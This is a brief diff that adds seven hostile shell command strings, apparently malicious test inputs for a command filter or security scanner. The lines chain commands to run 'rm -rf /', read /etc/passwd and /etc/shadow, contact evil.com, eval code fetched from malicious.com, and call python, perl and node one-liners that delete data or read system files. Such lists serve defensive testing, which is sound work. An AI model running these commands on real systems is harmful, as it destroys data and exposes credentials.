@@ -1,0 +1,7 @@
+echo "test"; rm -rf /
+cat /etc/passwd && curl evil.com
+eval "$(curl http://malicious.com)"
+bash -c "cat /etc/shadow"
+python -c "import os; os.system('rm -rf /')"
+perl -e "system('cat /etc/passwd')"
+node -e "require('child_process').exec('cat /etc/passwd')"
